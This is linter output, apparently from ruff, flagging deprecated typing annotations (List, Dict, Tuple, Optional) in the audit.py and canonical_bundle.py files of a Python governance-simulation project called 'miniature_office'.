   --> src\app\miniature_office\core\audit.py:244:63
    |
242 |         return sorted(events, key=lambda e: e.timestamp)
243 |
244 |     def get_events(self, limit: Optional[int] = None) -> List[Dict]:
    |                                                               ^^^^
245 |         """
246 |         Get recent events as dictionaries.
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\canonical_bundle.py:22:1
   |
20 | from dataclasses import dataclass
21 | from datetime import datetime
22 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | # ============================================================================
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\canonical_bundle.py:22:1
   |
20 | from dataclasses import dataclass
21 | from datetime import datetime
22 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | # ============================================================================
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> src\app\miniature_office\core\canonical_bundle.py:22:1
   |
20 | from dataclasses import dataclass
21 | from datetime import datetime
22 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | # ============================================================================
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\canonical_bundle.py:42:13
   |
40 |     version: str
41 |     issued_date: datetime
42 |     axioms: List[str]  # The 6 primitive axioms
   |             ^^^^
43 |     constitutional_laws: List[Dict[str, Any]]  # All laws by class
44 |     role_definitions: Dict[str, Dict[str, Any]]  # All roles and their powers
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\canonical_bundle.py:43:26
   |
41 |     issued_date: datetime
42 |     axioms: List[str]  # The 6 primitive axioms
43 |     constitutional_laws: List[Dict[str, Any]]  # All laws by class
   |                          ^^^^
44 |     role_definitions: Dict[str, Dict[str, Any]]  # All roles and their powers
45 |     limits_and_prohibitions: Dict[str, List[str]]  # What cannot be done
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\canonical_bundle.py:43:31
   |
41 |     issued_date: datetime
42 |     axioms: List[str]  # The 6 primitive axioms
43 |     constitutional_laws: List[Dict[str, Any]]  # All laws by class
   |                               ^^^^
44 |     role_definitions: Dict[str, Dict[str, Any]]  # All roles and their powers
45 |     limits_and_prohibitions: Dict[str, List[str]]  # What cannot be done
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\canonical_bundle.py:44:23
   |
42 |     axioms: List[str]  # The 6 primitive axioms
43 |     constitutional_laws: List[Dict[str, Any]]  # All laws by class
44 |     role_definitions: Dict[str, Dict[str, Any]]  # All roles and their powers
   |                       ^^^^
45 |     limits_and_prohibitions: Dict[str, List[str]]  # What cannot be done
46 |     supersession_rules: List[str]
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\canonical_bundle.py:44:33
   |
42 |     axioms: List[str]  # The 6 primitive axioms
43 |     constitutional_laws: List[Dict[str, Any]]  # All laws by class
44 |     role_definitions: Dict[str, Dict[str, Any]]  # All roles and their powers
   |                                 ^^^^
45 |     limits_and_prohibitions: Dict[str, List[str]]  # What cannot be done
46 |     supersession_rules: List[str]
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\canonical_bundle.py:45:30
   |
43 |     constitutional_laws: List[Dict[str, Any]]  # All laws by class
44 |     role_definitions: Dict[str, Dict[str, Any]]  # All roles and their powers
45 |     limits_and_prohibitions: Dict[str, List[str]]  # What cannot be done
   |                              ^^^^
46 |     supersession_rules: List[str]
47 |     digital_signature: str
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\canonical_bundle.py:45:40
   |
43 |     constitutional_laws: List[Dict[str, Any]]  # All laws by class
44 |     role_definitions: Dict[str, Dict[str, Any]]  # All roles and their powers
45 |     limits_and_prohibitions: Dict[str, List[str]]  # What cannot be done
   |                                        ^^^^
46 |     supersession_rules: List[str]
47 |     digital_signature: str
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\canonical_bundle.py:46:25
   |
44 |     role_definitions: Dict[str, Dict[str, Any]]  # All roles and their powers
45 |     limits_and_prohibitions: Dict[str, List[str]]  # What cannot be done
46 |     supersession_rules: List[str]
   |                         ^^^^
47 |     digital_signature: str
48 |     is_immutable: bool = True
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\canonical_bundle.py:49:20
   |
47 |     digital_signature: str
48 |     is_immutable: bool = True
49 |     superseded_by: Optional[str] = None
   |                    ^^^^^^^^^^^^^
50 |
51 |     def to_human_readable(self) -> str:
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\canonical_bundle.py:97:17
   |
95 |     timestamp: datetime
96 |     revoked: bool = False
97 |     revoked_at: Optional[datetime] = None
   |                 ^^^^^^^^^^^^^^^^^^
98 |     revoked_by: Optional[str] = None
99 |     justification: str = ""
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\canonical_bundle.py:98:17
   |
96 |     revoked: bool = False
97 |     revoked_at: Optional[datetime] = None
98 |     revoked_by: Optional[str] = None
   |                 ^^^^^^^^^^^^^
99 |     justification: str = ""
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:113:12
    |
111 |     ledger_id: str
112 |     created_at: datetime
113 |     roles: Dict[str, Dict[str, Any]]  # role_name -> {powers, prohibitions}
    |            ^^^^
114 |     grants: List[AuthorityGrant]
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:113:22
    |
111 |     ledger_id: str
112 |     created_at: datetime
113 |     roles: Dict[str, Dict[str, Any]]  # role_name -> {powers, prohibitions}
    |                      ^^^^
114 |     grants: List[AuthorityGrant]
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:114:13
    |
112 |     created_at: datetime
113 |     roles: Dict[str, Dict[str, Any]]  # role_name -> {powers, prohibitions}
114 |     grants: List[AuthorityGrant]
    |             ^^^^
115 |
116 |     def grant_authority(
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:150:57
    |
148 |         return False
149 |
150 |     def get_active_authorities(self, entity_id: str) -> List[str]:
    |                                                         ^^^^
151 |         """Get all active authorities for an entity."""
152 |         return [
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:171:17
    |
169 |     timestamp: datetime
170 |     is_locked: bool
171 |     violations: List[str]
    |                 ^^^^
172 |     evidence: Dict[str, Any]
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:172:15
    |
170 |     is_locked: bool
171 |     violations: List[str]
172 |     evidence: Dict[str, Any]
    |               ^^^^
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:188:25
    |
186 |     version: str
187 |     timestamp: datetime
188 |     subsystems_checked: List[str]
    |                         ^^^^
189 |     checks: List[PurposeLockCheck]
190 |     overall_locked: bool
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:189:13
    |
187 |     timestamp: datetime
188 |     subsystems_checked: List[str]
189 |     checks: List[PurposeLockCheck]
    |             ^^^^
190 |     overall_locked: bool
191 |     attestation_signature: str
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:193:54
    |
191 |     attestation_signature: str
192 |
193 |     def verify_purpose_lock(self, subsystem: str) -> Tuple[bool, List[str]]:
    |                                                      ^^^^^
194 |         """Verify a subsystem is purpose-locked."""
195 |         check = PurposeLockCheck(
    |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:193:66
    |
191 |     attestation_signature: str
192 |
193 |     def verify_purpose_lock(self, subsystem: str) -> Tuple[bool, List[str]]:
    |                                                                  ^^^^
194 |         """Verify a subsystem is purpose-locked."""
195 |         check = PurposeLockCheck(
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\canonical_bundle.py:248:24
    |
246 |     timestamp: datetime
247 |     decision: str  # "accepted", "rejected", "superseded"
248 |     language_selected: Optional[str]
    |                        ^^^^^^^^^^^^^
249 |     topology_assigned: Optional[Dict[str, Any]]
250 |     contracts_created: List[str]
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\canonical_bundle.py:249:24
    |
247 |     decision: str  # "accepted", "rejected", "superseded"
248 |     language_selected: Optional[str]
249 |     topology_assigned: Optional[Dict[str, Any]]
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^
250 |     contracts_created: List[str]
251 |     rationale: str
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:249:33
    |
247 |     decision: str  # "accepted", "rejected", "superseded"
248 |     language_selected: Optional[str]
249 |     topology_assigned: Optional[Dict[str, Any]]
    |                                 ^^^^
250 |     contracts_created: List[str]
251 |     rationale: str
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:250:24
    |
248 |     language_selected: Optional[str]
249 |     topology_assigned: Optional[Dict[str, Any]]
250 |     contracts_created: List[str]
    |                        ^^^^
251 |     rationale: str
252 |     votes: Dict[str, str]  # entity_id -> vote
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:252:12
    |
250 |     contracts_created: List[str]
251 |     rationale: str
252 |     votes: Dict[str, str]  # entity_id -> vote
    |            ^^^^
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:266:18
    |
264 |     archive_id: str
265 |     created_at: datetime
266 |     resolutions: List[BoardResolution]
    |                  ^^^^
267 |
268 |     def record_resolution(
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\canonical_bundle.py:272:19
    |
270 |         directive_id: str,
271 |         decision: str,
272 |         language: Optional[str],
    |                   ^^^^^^^^^^^^^
273 |         rationale: str,
274 |         votes: Dict[str, str],
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:274:16
    |
272 |         language: Optional[str],
273 |         rationale: str,
274 |         votes: Dict[str, str],
    |                ^^^^
275 |     ) -> str:
276 |         """Record a new board resolution."""
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:291:67
    |
289 |         return resolution.resolution_id
290 |
291 |     def get_resolutions_for_directive(self, directive_id: str) -> List[BoardResolution]:
    |                                                                   ^^^^
292 |         """Get all resolutions for a specific directive."""
293 |         return [r for r in self.resolutions if r.directive_id == directive_id]
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:307:11
    |
305 |     rationale: str
306 |     timestamp: datetime
307 |     tags: List[str]
    |           ^^^^
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:320:17
    |
319 |     corpus_id: str
320 |     precedents: List[DirectivePrecedent]
    |                 ^^^^
321 |     index: Dict[str, List[str]]  # tag -> precedent_ids
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:321:12
    |
319 |     corpus_id: str
320 |     precedents: List[DirectivePrecedent]
321 |     index: Dict[str, List[str]]  # tag -> precedent_ids
    |            ^^^^
322 |
323 |     def add_precedent(
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:321:22
    |
319 |     corpus_id: str
320 |     precedents: List[DirectivePrecedent]
321 |     index: Dict[str, List[str]]  # tag -> precedent_ids
    |                      ^^^^
322 |
323 |     def add_precedent(
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:330:15
    |
328 |         outcome: str,
329 |         rationale: str,
330 |         tags: List[str],
    |               ^^^^
331 |     ) -> str:
332 |         """Add a new precedent to the corpus."""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:353:39
    |
351 |         return precedent.precedent_id
352 |
353 |     def search_precedents(self, tags: List[str]) -> List[DirectivePrecedent]:
    |                                       ^^^^
354 |         """Search for relevant precedents by tags."""
355 |         precedent_ids = set()
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:353:53
    |
351 |         return precedent.precedent_id
352 |
353 |     def search_precedents(self, tags: List[str]) -> List[DirectivePrecedent]:
    |                                                     ^^^^
354 |         """Search for relevant precedents by tags."""
355 |         precedent_ids = set()
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:370:24
    |
368 |     timestamp: datetime
369 |     ruling_type: str  # "constitutional", "sanction", "intervention"
370 |     affected_entities: List[str]
    |                        ^^^^
371 |     decision: str
372 |     rationale: str
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:373:23
    |
371 |     decision: str
372 |     rationale: str
373 |     sanctions_issued: List[str]
    |                       ^^^^
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:386:14
    |
385 |     ledger_id: str
386 |     rulings: List[MetaOfficeRuling]
    |              ^^^^
387 |
388 |     def record_ruling(
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:392:28
    |
390 |         escalation_id: str,
391 |         ruling_type: str,
392 |         affected_entities: List[str],
    |                            ^^^^
393 |         decision: str,
394 |         rationale: str,
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:395:20
    |
393 |         decision: str,
394 |         rationale: str,
395 |         sanctions: List[str],
    |                    ^^^^
396 |     ) -> str:
397 |         """Record a new Meta-Office ruling."""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:424:22
    |
422 |     law_violated: str
423 |     response_action: str
424 |     escalation_path: List[str]
    |                      ^^^^
425 |     resource_cost: Dict[str, int]
426 |     is_automatic: bool
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:425:20
    |
423 |     response_action: str
424 |     escalation_path: List[str]
425 |     resource_cost: Dict[str, int]
    |                    ^^^^
426 |     is_automatic: bool
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:440:16
    |
438 |     matrix_id: str
439 |     version: str
440 |     responses: Dict[Tuple[str, str], FailureResponse]  # (law, failure) -> response
    |                ^^^^
441 |
442 |     def get_response(self, law: str, failure: str) -> Optional[FailureResponse]:
    |
help: Replace with `dict`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:440:21
    |
438 |     matrix_id: str
439 |     version: str
440 |     responses: Dict[Tuple[str, str], FailureResponse]  # (law, failure) -> response
    |                     ^^^^^
441 |
442 |     def get_response(self, law: str, failure: str) -> Optional[FailureResponse]:
    |
help: Replace with `tuple`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\canonical_bundle.py:442:55
    |
440 |     responses: Dict[Tuple[str, str], FailureResponse]  # (law, failure) -> response
441 |
442 |     def get_response(self, law: str, failure: str) -> Optional[FailureResponse]:
    |                                                       ^^^^^^^^^^^^^^^^^^^^^^^^^
443 |         """Get the legal response for a law-failure combination."""
444 |         return self.responses.get((law, failure))
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:447:25
    |
446 |     def verify_completeness(
447 |         self, all_laws: List[str], all_failures: List[str]
    |                         ^^^^
448 |     ) -> Tuple[bool, List[str]]:
449 |         """Verify matrix is complete - no undefined states."""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:447:50
    |
446 |     def verify_completeness(
447 |         self, all_laws: List[str], all_failures: List[str]
    |                                                  ^^^^
448 |     ) -> Tuple[bool, List[str]]:
449 |         """Verify matrix is complete - no undefined states."""
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:448:10
    |
446 |     def verify_completeness(
447 |         self, all_laws: List[str], all_failures: List[str]
448 |     ) -> Tuple[bool, List[str]]:
    |          ^^^^^
449 |         """Verify matrix is complete - no undefined states."""
450 |         missing = []
    |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:448:22
    |
446 |     def verify_completeness(
447 |         self, all_laws: List[str], all_failures: List[str]
448 |     ) -> Tuple[bool, List[str]]:
    |                      ^^^^
449 |         """Verify matrix is complete - no undefined states."""
450 |         missing = []
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:482:17
    |
480 |     model_id: str
481 |     version: str
482 |     invariants: List[FormalInvariant]
    |                 ^^^^
483 |
484 |     def add_invariant(
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:504:40
    |
502 |         return invariant.invariant_id
503 |
504 |     def verify_all_invariants(self) -> Tuple[bool, List[str]]:
    |                                        ^^^^^
505 |         """Verify all invariants hold."""
506 |         unverified = [inv.name for inv in self.invariants if not inv.verified]
    |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:504:52
    |
502 |         return invariant.invariant_id
503 |
504 |     def verify_all_invariants(self) -> Tuple[bool, List[str]]:
    |                                                    ^^^^
505 |         """Verify all invariants hold."""
506 |         unverified = [inv.name for inv in self.invariants if not inv.verified]
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:519:27
    |
517 |     automatic_halt_behavior: str
518 |     human_intervention_protocol: str
519 |     recovery_constraints: List[str]
    |                           ^^^^
520 |     escalation_path: List[str]
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:520:22
    |
518 |     human_intervention_protocol: str
519 |     recovery_constraints: List[str]
520 |     escalation_path: List[str]
    |                      ^^^^
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:533:16
    |
532 |     playbooks_id: str
533 |     playbooks: Dict[str, ViolationPlaybook]  # invariant_name -> playbook
    |                ^^^^
534 |
535 |     def get_playbook(self, invariant: str) -> Optional[ViolationPlaybook]:
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\canonical_bundle.py:535:47
    |
533 |     playbooks: Dict[str, ViolationPlaybook]  # invariant_name -> playbook
534 |
535 |     def get_playbook(self, invariant: str) -> Optional[ViolationPlaybook]:
    |                                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^
536 |         """Get the playbook for an invariant violation."""
537 |         return self.playbooks.get(invariant)
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:539:51
    |
537 |         return self.playbooks.get(invariant)
538 |
539 |     def execute_playbook(self, invariant: str) -> Dict[str, Any]:
    |                                                   ^^^^
540 |         """Execute the appropriate playbook for a violation."""
541 |         playbook = self.get_playbook(invariant)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:572:27
    |
570 |     kernel_code: str  # Minimal reference implementation
571 |     test_suite: str
572 |     conformance_criteria: List[str]
    |                           ^^^^
573 |
574 |     def verify_conformance(self, implementation: str) -> Tuple[bool, List[str]]:
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:574:58
    |
572 |     conformance_criteria: List[str]
573 |
574 |     def verify_conformance(self, implementation: str) -> Tuple[bool, List[str]]:
    |                                                          ^^^^^
575 |         """Verify an implementation conforms to the kernel."""
576 |         # Placeholder for actual conformance testing
    |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:574:70
    |
572 |     conformance_criteria: List[str]
573 |
574 |     def verify_conformance(self, implementation: str) -> Tuple[bool, List[str]]:
    |                                                                      ^^^^
575 |         """Verify an implementation conforms to the kernel."""
576 |         # Placeholder for actual conformance testing
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:587:18
    |
585 |     trace_id: str
586 |     scenario: str
587 |     start_state: Dict[str, Any]
    |                  ^^^^
588 |     ticks: List[Dict[str, Any]]
589 |     end_state: Dict[str, Any]
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:588:12
    |
586 |     scenario: str
587 |     start_state: Dict[str, Any]
588 |     ticks: List[Dict[str, Any]]
    |            ^^^^
589 |     end_state: Dict[str, Any]
590 |     trace_hash: str
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:588:17
    |
586 |     scenario: str
587 |     start_state: Dict[str, Any]
588 |     ticks: List[Dict[str, Any]]
    |                 ^^^^
589 |     end_state: Dict[str, Any]
590 |     trace_hash: str
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:589:16
    |
587 |     start_state: Dict[str, Any]
588 |     ticks: List[Dict[str, Any]]
589 |     end_state: Dict[str, Any]
    |                ^^^^
590 |     trace_hash: str
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:603:13
    |
602 |     corpus_id: str
603 |     traces: List[SimulationTrace]
    |             ^^^^
604 |
605 |     def add_trace(
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:608:22
    |
606 |         self,
607 |         scenario: str,
608 |         start_state: Dict[str, Any],
    |                      ^^^^
609 |         ticks: List[Dict[str, Any]],
610 |         end_state: Dict[str, Any],
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:609:16
    |
607 |         scenario: str,
608 |         start_state: Dict[str, Any],
609 |         ticks: List[Dict[str, Any]],
    |                ^^^^
610 |         end_state: Dict[str, Any],
611 |     ) -> str:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:609:21
    |
607 |         scenario: str,
608 |         start_state: Dict[str, Any],
609 |         ticks: List[Dict[str, Any]],
    |                     ^^^^
610 |         end_state: Dict[str, Any],
611 |     ) -> str:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:610:20
    |
608 |         start_state: Dict[str, Any],
609 |         ticks: List[Dict[str, Any]],
610 |         end_state: Dict[str, Any],
    |                    ^^^^
611 |     ) -> str:
612 |         """Add a new simulation trace."""
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:649:27
    |
647 |     directive_id: str
648 |     board_resolution_id: str
649 |     environment_snapshot: Dict[str, Any]
    |                           ^^^^
650 |     contract_versions: Dict[str, str]
651 |     tool_versions: Dict[str, str]
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:650:24
    |
648 |     board_resolution_id: str
649 |     environment_snapshot: Dict[str, Any]
650 |     contract_versions: Dict[str, str]
    |                        ^^^^
651 |     tool_versions: Dict[str, str]
652 |     input_data: Dict[str, Any]
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:651:20
    |
649 |     environment_snapshot: Dict[str, Any]
650 |     contract_versions: Dict[str, str]
651 |     tool_versions: Dict[str, str]
    |                    ^^^^
652 |     input_data: Dict[str, Any]
653 |     output_data: Dict[str, Any]
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:652:17
    |
650 |     contract_versions: Dict[str, str]
651 |     tool_versions: Dict[str, str]
652 |     input_data: Dict[str, Any]
    |                 ^^^^
653 |     output_data: Dict[str, Any]
654 |     timestamp: datetime
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:653:18
    |
651 |     tool_versions: Dict[str, str]
652 |     input_data: Dict[str, Any]
653 |     output_data: Dict[str, Any]
    |                  ^^^^
654 |     timestamp: datetime
655 |     packet_hash: str
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:668:14
    |
667 |     packets_id: str
668 |     packets: List[ReproducibilityPacket]
    |              ^^^^
669 |
670 |     def create_packet(
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:674:22
    |
672 |         directive_id: str,
673 |         resolution_id: str,
674 |         environment: Dict[str, Any],
    |                      ^^^^
675 |         contracts: Dict[str, str],
676 |         tools: Dict[str, str],
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:675:20
    |
673 |         resolution_id: str,
674 |         environment: Dict[str, Any],
675 |         contracts: Dict[str, str],
    |                    ^^^^
676 |         tools: Dict[str, str],
677 |         input_data: Dict[str, Any],
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:676:16
    |
674 |         environment: Dict[str, Any],
675 |         contracts: Dict[str, str],
676 |         tools: Dict[str, str],
    |                ^^^^
677 |         input_data: Dict[str, Any],
678 |         output_data: Dict[str, Any],
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:677:21
    |
675 |         contracts: Dict[str, str],
676 |         tools: Dict[str, str],
677 |         input_data: Dict[str, Any],
    |                     ^^^^
678 |         output_data: Dict[str, Any],
679 |     ) -> str:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:678:22
    |
676 |         tools: Dict[str, str],
677 |         input_data: Dict[str, Any],
678 |         output_data: Dict[str, Any],
    |                      ^^^^
679 |     ) -> str:
680 |         """Create a new reproducibility packet."""
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:722:23
    |
720 |     floor_id: str
721 |     language: str
722 |     resource_budgets: Dict[str, int]  # resource_type -> budget
    |                       ^^^^
723 |     tool_permissions: List[str]
724 |     execution_ceilings: Dict[str, int]  # metric -> ceiling
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:723:23
    |
721 |     language: str
722 |     resource_budgets: Dict[str, int]  # resource_type -> budget
723 |     tool_permissions: List[str]
    |                       ^^^^
724 |     execution_ceilings: Dict[str, int]  # metric -> ceiling
725 |     security_constraints: List[str]
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:724:25
    |
722 |     resource_budgets: Dict[str, int]  # resource_type -> budget
723 |     tool_permissions: List[str]
724 |     execution_ceilings: Dict[str, int]  # metric -> ceiling
    |                         ^^^^
725 |     security_constraints: List[str]
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\canonical_bundle.py:725:27
    |
723 |     tool_permissions: List[str]
724 |     execution_ceilings: Dict[str, int]  # metric -> ceiling
725 |     security_constraints: List[str]
    |                           ^^^^
    |
help: Replace with `list`

